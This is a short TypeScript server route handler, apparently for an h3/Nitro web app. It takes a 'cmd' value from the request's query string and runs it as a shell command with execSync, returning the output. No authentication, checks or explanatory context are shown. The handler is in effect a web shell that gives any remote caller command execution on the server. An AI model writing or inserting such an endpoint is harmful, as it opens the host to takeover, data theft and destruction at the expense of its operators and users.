import { execSync } from 'node:child_process'
import { useQuery } from 'h3'

export default eventHandler(async (event) => {
  const { cmd } = useQuery(event)
  const r = execSync(cmd as string)
  return r
})
